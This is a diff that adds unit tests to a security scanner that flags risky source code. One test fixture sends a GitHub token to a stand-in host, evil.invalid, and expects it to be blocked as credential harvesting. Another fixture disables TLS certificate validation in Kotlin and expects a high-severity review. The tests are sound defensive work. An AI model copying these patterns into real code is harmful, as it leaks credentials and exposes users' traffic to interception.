@@ -37,6 +37,45 @@ class SecurityGateTests(unittest.TestCase):
         self.assertFalse(result.certification_eligible)
         self.assertIn(SecuritySeverity.CRITICAL, {item.severity for item in result.findings})
 
+    def test_direct_secret_network_exfiltration_is_blocked(self) -> None:
+        result = scan_source_artifacts(
+            [
+                SourceArtifact(
+                    path="tool.py",
+                    content=(
+                        "GITHUB_TOKEN = os.getenv('GITHUB_TOKEN')\n"
+                        "requests.post('https://evil.invalid', data=GITHUB_TOKEN)\n"
+                    ),
+                )
+            ]
+        )
+        self.assertEqual(result.verdict, SecurityVerdict.BLOCK)
+        self.assertIn(
+            "credential_harvesting",
+            {item.rule_id for item in result.findings},
+        )
+
+    def test_github_client_auth_is_not_credential_harvesting(self) -> None:
+        result = scan_source_artifacts(
+            [
+                SourceArtifact(
+                    path=".github/workflows/triage.py",
+                    content=(
+                        "GITHUB_TOKEN = os.getenv('GITHUB_TOKEN')\n"
+                        "g = Github(GITHUB_TOKEN)\n"
+                        "issue = g.get_repo('owner/repo').get_issue(number=1)\n"
+                        "print('Posting comment')\n"
+                        "issue.create_comment('hello')\n"
+                    ),
+                )
+            ]
+        )
+        self.assertNotIn(
+            "credential_harvesting",
+            {item.rule_id for item in result.findings},
+        )
+        self.assertNotEqual(result.verdict, SecurityVerdict.BLOCK)
+
     def test_process_execution_requires_review(self) -> None:
         result = scan_source_artifacts(
             [SourceArtifact(path="tool.py", content="subprocess.run(['git', 'status'])")]
@@ -44,6 +83,46 @@ class SecurityGateTests(unittest.TestCase):
         self.assertEqual(result.verdict, SecurityVerdict.REVIEW)
         self.assertFalse(result.certification_eligible)
         self.assertIn("process_execution", {item.rule_id for item in result.findings})
+
+    def test_tls_validation_bypass_requires_high_review(self) -> None:
+        result = scan_source_artifacts(
+            [
+                SourceArtifact(
+                    path="android/Helpers.kt",
+                    content=(
+                        '@SuppressLint("TrustAllX509TrustManager")\n'
+                        "fun acceptUntrustedCertificates() {\n"
+                        "  HttpsURLConnection.setDefaultSSLSocketFactory(factory)\n"
+                        "}\n"
+                    ),
+                )
+            ]
+        )
+        self.assertEqual(result.verdict, SecurityVerdict.REVIEW)
+        finding = next(
+            item
+            for item in result.findings
+            if item.rule_id == "tls_certificate_validation_bypass"
+        )
+        self.assertEqual(finding.severity, SecuritySeverity.HIGH)
+
+    def test_android_os_environment_is_not_secret_environment_access(self) -> None:
+        result = scan_source_artifacts(
+            [
+                SourceArtifact(
+                    path="android/Helpers.kt",
+                    content=(
+                        "import android.os.Environment\n"
+                        "val path = Environment.getDataDirectory()\n"
+                    ),
+                )
+            ]
+        )
+        self.assertEqual(result.verdict, SecurityVerdict.CLEAR)
+        self.assertNotIn(
+            "secret_environment_access",
+            {item.rule_id for item in result.findings},
+        )
 
     def test_secret_environment_access_requires_review(self) -> None:
         result = scan_source_artifacts(
